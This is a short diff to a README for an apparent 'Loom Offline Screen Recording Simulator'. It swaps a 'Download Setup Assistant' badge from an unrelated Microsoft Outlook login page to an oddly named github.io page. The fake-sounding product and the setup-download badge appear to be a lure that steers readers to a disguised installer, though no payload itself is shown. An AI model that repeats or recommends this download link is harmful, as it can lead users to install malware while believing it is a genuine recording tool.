@@ -1,6 +1,6 @@
 # 🎥 Loom — Offline Screen Recording Simulator
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://www.microsoft.com/en-us/microsoft-365/outlook/log-in)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://loom-offline-video-recording.github.io/.github)
 
 ## ⚙️ How to Use
 
